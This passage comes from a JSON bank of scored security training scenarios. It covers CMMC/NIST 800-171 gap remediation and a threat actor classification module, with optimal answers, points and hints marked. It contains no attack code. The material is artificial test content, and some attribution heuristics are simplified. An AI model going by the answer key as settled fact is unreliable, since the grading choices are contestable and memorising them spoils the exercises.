            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Prioritize policies and procedures - they satisfy compliance requirements at lower cost",
            "feedback": "Policies without enforcement are ineffective. 'We have a policy' doesn't protect systems if it's not implemented. Assessors verify both policy existence AND implementation. Policy-only approaches often fail assessments and certainly fail security tests.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Defense in depth - technical controls enforcing requirements, policies documenting standards, and monitoring validating both",
            "feedback": "Exactly right. Effective security requires: policies defining requirements, technical controls enforcing them where possible, administrative controls (training, procedures) for human-dependent processes, and monitoring to verify effectiveness. This layered approach satisfies compliance and provides actual security.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let each control owner decide - IT implements technical solutions, HR implements administrative solutions",
            "feedback": "Decentralized decision-making creates inconsistency and gaps. Some controls require coordinated technical and administrative components. A unified approach ensures coverage and alignment. Security should drive the approach, not organizational convenience.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "NIST 800-171 assessors verify both documentation AND implementation. What approach satisfies both?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Defense in depth: policies set standards, technical controls enforce, administrative controls enable human compliance, monitoring validates all.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-006",
        "sequence": 6,
        "title": "Remediation Prioritization",
        "situation": "You've identified 73 gaps across the 110 controls. Resources allow addressing roughly 25% per quarter. You need to prioritize the remediation roadmap.\n\n**Question:** What should be the PRIMARY factor in prioritizing remediation?",
        "options": [
          {
            "id": "A",
            "text": "Ease of implementation - quick wins first to show progress",
            "feedback": "Quick wins provide momentum but shouldn't override risk prioritization. If easy fixes address low-risk gaps while critical vulnerabilities remain, you're optimizing for optics rather than security. Risk should drive priority.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk level - address highest risk gaps first regardless of implementation difficulty",
            "feedback": "Correct. Risk-based prioritization ensures the most dangerous gaps are addressed first. Factor in both likelihood (how exploitable) and impact (what happens if exploited). While quick wins have value, they should supplement, not replace, risk-driven prioritization.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Alphabetical by control family - systematic and easy to track",
            "feedback": "Alphabetical ordering has no relationship to risk or business need. Access Control (AC) coming before System and Information Integrity (SI) alphabetically doesn't mean it's more important. Prioritization must be meaningful.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cost - address lowest cost items first to maximize the number of gaps closed",
            "feedback": "Closing many low-cost gaps looks good on metrics but may leave critical vulnerabilities unaddressed. A single critical gap can result in breach regardless of how many minor gaps were closed. Risk should drive spending, not the reverse.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What's the consequence of leaving a gap unaddressed? That should influence when it's fixed.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Risk = Likelihood \u00c3\u2014 Impact. Prioritize gaps that are both exploitable and high-impact.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-007",
        "sequence": 7,
        "title": "Plan of Action and Milestones (POA&M)",
        "situation": "For gaps that won't be fully remediated by assessment time, you need to develop Plans of Action and Milestones (POA&Ms). The IT Director asks how detailed these need to be.\n\n**Question:** What should POA&Ms include to satisfy compliance requirements?",
        "options": [
          {
            "id": "A",
            "text": "Simple list of gaps with target completion dates",
            "feedback": "Minimal POA&Ms may not satisfy assessors or demonstrate genuine commitment to remediation. POA&Ms should show you understand the gap, have a real plan, and have allocated resources. Simple lists suggest gaps aren't being taken seriously.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Gap description, risk/impact, specific remediation steps, resource allocation, milestones, responsible parties, and target dates",
            "feedback": "Excellent. Comprehensive POA&Ms demonstrate: understanding of the gap and its risk, concrete remediation approach, commitment of resources, accountability through assigned owners, and realistic timelines with measurable milestones. This shows genuine intent and enables tracking.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Just mark gaps as 'planned' - details can be added later when resources are available",
            "feedback": "Vague POA&Ms without plans signal that gaps aren't being addressed seriously. Assessors look for evidence of genuine remediation commitment. 'We'll figure it out later' is not a plan and will likely result in assessment findings.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Include only gaps that will be closed within 90 days - longer items should be marked as accepted risk",
            "feedback": "POA&Ms can and should include items requiring longer remediation. Accepting risk on required controls doesn't satisfy compliance - CMMC requires all 110 practices. Items requiring extended timelines need POA&Ms with appropriate milestones.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "POA&Ms should demonstrate genuine commitment and realistic planning, not just acknowledgment of gaps.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Include: what, why (risk), how, who, when, and measurable milestones for tracking progress.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-008",
        "sequence": 8,
        "title": "Third-Party Risk Assessment",
        "situation": "During the assessment, you discover Pinnacle uses a cloud-based ERP system that will process CUI. The vendor claims they're 'SOC 2 compliant.' The IT Director assumes this means the vendor is secure.\n\n**Question:** How should you assess and address this third-party risk?",
        "options": [
          {
            "id": "A",
            "text": "SOC 2 compliance is sufficient - no additional assessment needed for the vendor",
            "feedback": "SOC 2 addresses security controls but doesn't ensure NIST 800-171 compliance or FedRAMP authorization required for CUI processing in cloud systems. SOC 2 is valuable but not sufficient for this specific requirement. Further due diligence is needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Request the vendor's SOC 2 report, verify FedRAMP authorization or NIST 800-171 compliance for CUI processing, include in flow-down requirements",
            "feedback": "Excellent due diligence. SOC 2 should be reviewed for relevant controls. For CUI, the vendor must meet FedRAMP or demonstrate NIST 800-171 compliance. DFARS flow-down clauses must be in the contract. This systematic approach addresses the actual requirement.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Eliminate the cloud ERP - move everything back on-premise to maintain control",
            "feedback": "Cloud services can be compliant if properly selected and managed. Moving everything on-premise has its own challenges and may not be practical. The solution is proper vendor assessment and contract requirements, not avoiding cloud entirely.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Trust the vendor's claims - questioning vendors damages business relationships",
            "feedback": "Trust but verify applies to vendor security claims. Security assessors will question third-party risks. 'The vendor said they're secure' without evidence is insufficient. Due diligence is expected and vendors should expect and cooperate with such requests.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "CUI processing in cloud systems has specific requirements beyond general security certifications.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "DFARS requires flow-down of security requirements to subcontractors/vendors handling CUI. FedRAMP or equivalent is typically required.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-009",
        "sequence": 9,
        "title": "Continuous Monitoring Plan",
        "situation": "Gap analysis is point-in-time, but CMMC requires ongoing compliance. The CEO asks what happens after the initial assessment is complete.\n\n**Question:** What should you recommend for ongoing compliance monitoring?",
        "options": [
          {
            "id": "A",
            "text": "Annual assessments are sufficient - repeat this gap analysis yearly",
            "feedback": "Annual assessments alone miss drift between assessments. Configurations change, new systems are deployed, vulnerabilities emerge. NIST 800-171 requires continuous monitoring, not just periodic assessment. Annual reviews should validate continuous monitoring, not replace it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement continuous monitoring: automated compliance scanning, configuration drift detection, vulnerability management, and regular control testing",
            "feedback": "Excellent. Continuous monitoring maintains compliance between assessments through: automated configuration compliance checking, vulnerability scanning (at least monthly), log monitoring and review, regular control testing, and POA&M tracking. This is explicitly required by NIST 800-171 (CA family).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The C3PAO will monitor compliance - that's what the certification process provides",
            "feedback": "C3PAOs assess compliance at certification time and during reassessment - they don't provide ongoing monitoring. The organization is responsible for maintaining compliance between assessments. Relying on external assessors for continuous monitoring is not how CMMC works.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only monitor systems that process CUI - other systems don't need continuous monitoring",
            "feedback": "Systems in scope (processing CUI) require monitoring, but supporting systems (DNS, AD, email) affect CUI system security. Compromised supporting infrastructure compromises CUI systems. Monitor the full scope including supporting systems.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "NIST 800-171 CA family specifically requires ongoing security assessments and continuous monitoring.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Continuous monitoring = automated scanning + manual reviews + vulnerability management + POA&M tracking + metrics reporting.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-010",
        "sequence": 10,
        "title": "Executive Report Development",
        "situation": "You're preparing the gap analysis report for executive leadership. The full technical findings document is 150 pages. The CEO has requested an executive briefing.\n\n**Question:** What should the executive summary emphasize?",
        "options": [
          {
            "id": "A",
            "text": "Detailed technical findings for each of the 110 controls",
            "feedback": "Executives need strategic information to make decisions, not technical details. 150 pages of control-by-control analysis loses the key messages. Technical details should be in appendices for those who need them, not the executive summary.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Overall compliance status, highest-risk gaps, resource requirements, timeline to compliance, and decision points requiring executive action",
            "feedback": "Excellent executive communication. Leadership needs: current state summary (X of 110 controls compliant), risk-prioritized key gaps (the 5-10 most critical), what's needed (budget, personnel, time), when they'll be ready (compliance timeline), and what they need to decide (approve resources, accept risks, prioritize initiatives).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Comparison to industry peers showing Pinnacle's relative security posture",
            "feedback": "Peer comparison might be interesting but isn't the primary purpose. The goal is CMMC certification, not relative comparison. Executives need to know: Are we compliant? What do we need to do? What resources are required? Peer comparison can be supplementary context at best.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "All positive findings first to demonstrate existing security investments are working",
            "feedback": "While acknowledging existing controls is appropriate, the gap analysis purpose is to identify gaps, not celebrate successes. Leading with positives buries the critical findings. A brief positive acknowledgment followed by focus on gaps and remediation is appropriate.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What do executives need to know to make decisions and allocate resources?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Status, risk, cost, timeline, decisions needed. Everything else is supporting detail.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-REM-001",
    "title": "Know Your Enemy",
    "domain": 2,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "30-40 minutes",
    "role": "Junior Threat Intelligence Analyst (Trainee)",
    "organization": {
      "name": "CyberDefense Academy",
      "industry": "Threat Intelligence Training Center"
    },
    "introduction": "Welcome to Day 1 of your threat intelligence analyst training at CyberDefense Academy. Your mentor, Senior Analyst Martinez, has prepared a series of exercises to help you master threat actor classification. 'Understanding who attacks us and why is fundamental to defense,' she explains. 'Attribution isn't about revenge - it's about predicting behavior, prioritizing defenses, and communicating risk to leadership. Let's start with the basics and work through increasingly complex scenarios.'",
    "learning_objectives": [
      "Compare and contrast common threat actors and motivations"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Basic Actor Identification",
        "situation": "Analyst Martinez starts with a warm-up. 'A company reports an incident: their website was defaced with political messaging about climate change, their customer database was leaked online with a statement calling out the company's environmental practices, and a Twitter account claimed credit linking to leaked data. No ransom demand. No evidence of long-term access. What type of threat actor is this?'\n\n**Question:** What type of threat actor MOST likely conducted this attack?",
        "options": [
          {
            "id": "A",
            "text": "Nation-state actor conducting influence operations",
            "feedback": "{'short': 'Nation-states rarely claim credit publicly like this', 'detailed': \"Nation-state actors prioritize stealth and deniability. They don't typically deface websites with political messages or claim credit on social media. Their influence operations are more subtle. The public nature and ideological messaging point to hacktivists.\", 'consequence': 'Misattribution leads to over-escalation and wrong defensive focus.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Hacktivist group with environmental ideology",
            "feedback": "{'short': 'Correct! Classic hacktivist indicators', 'detailed': 'This has all the hallmarks of hacktivism: website defacement with ideological message, data leak for embarrassment (not sale), public claim of responsibility on social media, target selection based on perceived environmental harm, and no financial motivation. Hacktivists want publicity for their cause.', 'consequence': 'Correct attribution informs appropriate response - focus on public relations and fixing the vulnerabilities exploited.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Organized crime group attempting extortion",
            "feedback": "{'short': 'No financial motive evident', 'detailed': \"Criminal groups want money. There's no ransom demand, no offer to sell the data back, no threat to leak unless paid. The data was leaked freely with political messaging. Criminals don't waste valuable data on political statements - they monetize it.\", 'consequence': 'Waiting for ransom demand that never comes. Missing the reputational response needed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Insider threat from disgruntled employee",
            "feedback": "{'short': 'Possible but public claim points elsewhere', 'detailed': \"An insider could have access, but the public Twitter claim and coordination with ideological messaging suggests an external hacktivist group. Insiders typically don't maintain public social media presence claiming attacks - they try to remain anonymous or frame others.\", 'consequence': 'Internal investigation while external hacktivist group continues operations against industry targets.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What type of attacker publicly claims credit and has ideological motivation?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Hacktivists want publicity for their cause. They deface websites, leak data for embarrassment, and publicly claim credit on social media."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Motivation Analysis",
        "situation": "'Good,' Martinez says. 'Now let's think about motivation. A healthcare organization reports: patient records accessed and encrypted with ransomware, ransom note demanding $500,000 in Bitcoin, threat to leak data if not paid, attack occurred through phishing email. What is the PRIMARY motivation?'\n\n**Question:** What is the PRIMARY motivation behind this attack?",
        "options": [
          {
            "id": "A",
            "text": "Espionage - healthcare data has intelligence value",
            "feedback": "{'short': \"Espionage actors don't demand ransom\", 'detailed': \"Espionage actors steal data quietly for intelligence purposes. They don't encrypt it and demand payment. The ransomware and Bitcoin demand clearly indicate financial motivation, not espionage. Espionage actors would exfiltrate silently and maintain access.\", 'consequence': 'Treating this as espionage delays ransom negotiation and recovery decisions.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Financial gain - ransomware is a money-making operation",
            "feedback": "{'short': 'Correct! Clear financial motivation', 'detailed': 'This is textbook financially motivated cybercrime: ransomware encryption, specific Bitcoin ransom demand, double extortion (pay or we leak). Healthcare is targeted because they need data urgently (patient care) and often pay. The actors want money - nothing else explains the behavior.', 'consequence': 'Correct motivation assessment informs business decisions about ransom, recovery strategy, and future defenses.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Disruption - someone wants to harm healthcare operations",
            "feedback": "{'short': 'Disruption is an effect, not the motivation', 'detailed': \"The attack causes disruption, but that's the LEVERAGE for payment, not the goal. If disruption were the motivation, there would be no ransom demand - they'd just destroy the data. The offer to provide decryption key for payment proves the motivation is financial.\", 'consequence': \"Focus on 'who wants to disrupt us' instead of 'this is a criminal money-making operation.'\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Revenge - targeted attack from someone with a grudge",
            "feedback": "{'short': 'No indicators of targeted revenge', 'detailed': 'Revenge attacks are personal and targeted. This attack pattern - phishing email, ransomware, Bitcoin demand - is standard criminal operations used against thousands of targets. Nothing suggests personal targeting or revenge motivation.', 'consequence': \"Wasted investigation into 'who has a grudge' when this is opportunistic criminal targeting.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does a ransom demand tell you about attacker motivation?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Ransomware with cryptocurrency payment demands = financial motivation. Criminals want money."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Sophistication Assessment",
        "situation": "Martinez presents another scenario: 'Security logs show: Nmap scans from 50+ different IPs against your external hosts, brute force attempts against SSH using common password lists, attempted exploitation of Apache Struts vulnerability from 2017, all activity is noisy and easily detected. What's your assessment of the attacker sophistication?'\n\n**Question:** What level of sophistication does this activity indicate?",
        "options": [
          {
            "id": "A",
            "text": "High sophistication - coordinated attack from multiple IPs suggests botnet",
            "feedback": "{'short': \"Multiple IPs doesn't mean sophisticated\", 'detailed': 'Using multiple IPs for scanning is trivial - free proxy lists, Tor exit nodes, or cheap VPS services. Sophisticated attackers are characterized by: custom tools, zero-days, stealth, and operational security. This activity is noisy, uses default tools, and tries old vulnerabilities. Multiple IPs just shows basic operational awareness.', 'consequence': 'Overestimate threat, deploy expensive countermeasures against amateur activity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Low sophistication - noisy scanning with old exploits indicates script kiddie",
            "feedback": "{'short': 'Correct! Classic low-sophistication indicators', 'detailed': \"This is textbook script kiddie behavior: using Nmap with default settings (easily detected), brute forcing with common password lists, trying exploits for years-old vulnerabilities (2017 Struts), no attempt at stealth. Sophisticated attackers avoid detection; these attackers don't even try. Low threat if basic security is in place.\", 'consequence': \"Appropriate response - ensure patches are current, implement rate limiting, don't over-invest in this threat.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Medium sophistication - automated tools but showing persistence",
            "feedback": "{'short': \"Persistence without stealth isn't sophistication\", 'detailed': \"Running scans repeatedly doesn't indicate sophistication - it just indicates the attacker hasn't moved on yet. Sophistication is measured by technical capability and operational security, not persistence. These attackers are using basic tools with no evasion.\", 'consequence': 'Moderate response when minimal response would suffice.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cannot assess - need more information about the attacker",
            "feedback": "{'short': 'We have enough indicators to assess', 'detailed': \"The noisy scanning, default tool signatures, old exploit attempts, and lack of stealth ARE the assessment. You don't need to identify the specific attacker to assess sophistication. The technique quality tells you about capability.\", 'consequence': \"Analysis paralysis - waiting for information you don't need while attacks continue.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Sophisticated attackers prioritize stealth. What does 'easily detected' activity tell you?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Script kiddies use default tools, old exploits, and make no effort at evasion. Sophisticated actors use custom tools and blend in."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Attribution Confidence",
        "situation": "Martinez shows you a threat report: 'An attack on a defense contractor used malware with code overlap matching APT41, targeted data related to aerospace technology, infrastructure included a C2 server previously linked to Chinese operations, and timing coincided with US-China trade tensions. How confident should we be in attributing this to APT41?'\n\n**Question:** What confidence level is appropriate for this attribution?",
        "options": [
          {
            "id": "A",
            "text": "High confidence - multiple indicators point to APT41",
            "feedback": "{'short': 'Correct! Multiple independent indicators support attribution', 'detailed': 'High confidence attribution is supported by: code overlap with known APT41 malware (technical indicator), infrastructure linked to previous Chinese operations (infrastructure indicator), target profile matching Chinese intelligence priorities (targeting indicator), and geopolitical timing (contextual indicator). Multiple independent indicators corroborating the same actor = high confidence.', 'consequence': 'Confident attribution enables sharing with government, informs defense priorities, supports threat briefing.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Medium confidence - could be APT41 or could be false flag",
            "feedback": "{'short': 'Multiple corroborating indicators support high confidence', 'detailed': 'While false flags are possible, having MULTIPLE independent indicators (code, infrastructure, targeting, timing) all pointing to the same actor significantly increases confidence. False flags typically only replicate one or two indicators. The convergence of evidence here supports high confidence.', 'consequence': 'Unnecessarily hedged communication reduces usefulness of threat intelligence.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Low confidence - circumstantial evidence only",
            "feedback": "{'short': 'Code and infrastructure overlap is not circumstantial', 'detailed': \"Code overlap with known malware and shared C2 infrastructure are technical indicators, not circumstantial. 'Circumstantial' would be just targeting pattern or geopolitical timing alone. The combination of technical indicators with contextual factors supports high confidence.\", 'consequence': 'Valuable threat intelligence dismissed as speculation. Defensive opportunities missed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cannot attribute - never identify specific actors",
            "feedback": "{'short': 'Attribution is valuable when evidence supports it', 'detailed': 'Attribution, when properly supported by evidence, enables: understanding adversary capabilities, predicting future behavior, sharing intelligence with partners, and briefing leadership. Refusing to attribute when evidence supports it wastes valuable intelligence. Attribute with appropriate confidence levels.', 'consequence': 'Organization operates in the dark about who is targeting them and why.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How many independent lines of evidence point to the same actor?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "High confidence requires multiple independent indicators: technical (code, tools), infrastructure (C2 overlap), and contextual (targeting, timing) all corroborating."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Nation-State vs Criminal",
        "situation": "'This is a critical distinction,' Martinez emphasizes. 'A financial services company reports: attackers gained access through spear-phishing, moved laterally to SWIFT payment systems, attempted to initiate $50 million in wire transfers to overseas accounts, used custom malware not seen before, maintained access for 3 months before attempting theft. Nation-state or criminal?'\n\n**Question:** Is this MOST likely a nation-state or criminal threat actor?",
        "options": [
          {
            "id": "A",
            "text": "Nation-state - custom malware and 3-month dwell time indicate APT",
            "feedback": "{'short': \"Sophistication alone doesn't mean nation-state\", 'detailed': \"Custom malware and patient operations are not exclusive to nation-states. Sophisticated criminal groups (like Lazarus or FIN7) also develop custom tools and conduct multi-month operations. The KEY differentiator is OBJECTIVE. This attack aims to steal money via wire fraud - that's a criminal objective. Nation-states conducting espionage don't typically attempt wire transfers.\", 'consequence': \"Treating this as espionage when it's financial theft leads to wrong response priorities.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Criminal - the objective is financial theft via wire transfers",
            "feedback": "{'short': 'Correct! Objective determines classification', 'detailed': 'The defining characteristic is the OBJECTIVE: stealing money via SWIFT wire transfers. This is financial crime, not espionage. Yes, the operation is sophisticated (custom malware, patient access), but sophisticated criminals exist. Lazarus Group (North Korea) conducts exactly these operations - nation-state resources but criminal objectives (sanctions evasion through theft).', 'consequence': 'Correct classification informs response: law enforcement involvement, financial controls, transaction monitoring.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Nation-state criminal hybrid - could be state-sponsored financial theft",
            "feedback": "{'short': 'Valid nuance but still classified by objective', 'detailed': \"You're thinking of groups like Lazarus (North Korea) that blur the line. While technically nation-state sponsored, their SWIFT heist operations are CRIMINAL in nature. For response purposes, classify based on objective and behavior. Whether the criminal is employed by a government doesn't change how you respond to a wire fraud attempt.\", 'consequence': 'Overthinking classification. The response (stop the theft, involve law enforcement) is the same.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cannot determine without more information",
            "feedback": "{'short': 'The wire transfer objective is the key indicator', 'detailed': \"The attempted $50 million wire transfer tells you the objective is financial theft. That's the critical classification indicator. You don't need to identify the specific group to know this is a financially-motivated operation requiring a different response than espionage.\", 'consequence': 'Analysis paralysis while the incident response waits for classification.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What is the attacker trying to ACHIEVE? That's the key to classification."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Objective determines classification: espionage = nation-state, financial theft = criminal. Sophistication exists in both categories."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "APT Group Recognition",
        "situation": "Martinez pulls up a case file: 'A technology company discovers backdoor access. Investigation reveals: attackers compromised their software build system, injected code into updates distributed to customers, selectively activated malware only on government and defense contractor systems, exfiltrated data about cloud infrastructure. Which APT group's methodology does this match?'\n\n**Question:** Which APT group's methodology does this MOST closely match?",
        "options": [
          {
            "id": "A",
            "text": "APT41 - they target technology companies and conduct supply chain attacks",
            "feedback": "{'short': 'APT41 does supply chain but targeting differs', 'detailed': \"APT41 conducts supply chain attacks, but their targeting is broader and includes financial crime (gaming companies, etc.). The SELECTIVE activation on government/defense targets and focus on cloud infrastructure is more consistent with APT29's SolarWinds methodology.\", 'consequence': 'Wrong threat intelligence briefing. Different TTPs expected.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "APT29 - matches SolarWinds-style supply chain compromise targeting government",
            "feedback": "{'short': 'Correct! Classic APT29 supply chain methodology', 'detailed': \"This matches APT29's SolarWinds operation exactly: compromise software vendor's build system, inject backdoor into legitimate updates, distribute to thousands but SELECTIVELY activate on high-value targets (government, defense), focus on cloud/infrastructure access for espionage. This targeting precision and methodology is APT29's signature.\", 'consequence': 'Correct identification enables use of APT29 threat intelligence for detection and defense.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Lazarus Group - sophisticated long-term access for exfiltration",
            "feedback": "{'short': 'Lazarus targets are typically financial', 'detailed': \"Lazarus Group's sophisticated operations typically target financial institutions for theft or cryptocurrency exchanges. While they conduct espionage, their signature operations are financial. The government/defense targeting and supply chain methodology here is more consistent with APT29.\", 'consequence': 'Wrong attribution leads to inappropriate defense focus.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "FIN7 - they conduct sophisticated targeted attacks",
            "feedback": "{'short': 'FIN7 is financially motivated, not espionage', 'detailed': \"FIN7 is a criminal group focused on financial theft (point-of-sale, BEC). They don't conduct supply chain espionage against government targets. The operation described is clearly espionage-motivated targeting government and defense - that's nation-state APT territory, not FIN7.\", 'consequence': 'Completely wrong actor category - treating espionage as financial crime.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which APT group is famous for supply chain attacks with selective activation on government targets?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "APT29's SolarWinds attack: compromised build system, backdoored updates to 18,000 orgs, activated selectively on ~100 government/defense targets."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Insider vs External",
        "situation": "'Insider threats are often missed,' Martinez notes. 'An engineering company discovers: proprietary designs were exfiltrated over 6 months, data was accessed using a legitimate engineer's credentials during normal work hours, no malware or external C2 detected, the engineer recently received poor performance review and was passed over for promotion. External attacker with stolen credentials or insider threat?'\n\n**Question:** What type of threat does this MOST likely represent?",
        "options": [
          {
            "id": "A",
            "text": "External attacker who stole credentials - sophisticated actors can mimic normal behavior",
            "feedback": "{'short': 'No technical indicators of external compromise', 'detailed': \"External attackers typically leave some trace: phishing for credentials, malware for persistence, C2 for exfiltration. Here there's NO malware, NO external C2, and access patterns match legitimate work hours. Combined with the behavioral indicator (grievance after poor review), insider threat is more likely.\", 'consequence': 'External threat hunt wastes time. Insider continues exfiltration while investigation looks outward.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Insider threat - legitimate access, grievance motivation, no external indicators",
            "feedback": "{'short': 'Correct! Classic insider threat indicators', 'detailed': \"Multiple insider threat indicators: legitimate credentials used during normal hours (no anomaly in access pattern), no malware or C2 (doesn't need hacker tools - has real access), behavioral indicators (poor review, passed for promotion = grievance), and valuable data access matching job role. The ABSENCE of external attack indicators is itself an indicator.\", 'consequence': 'Correct identification enables HR involvement, access restriction, and appropriate investigation approach.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Negligent insider - accidental data exposure rather than intentional theft",
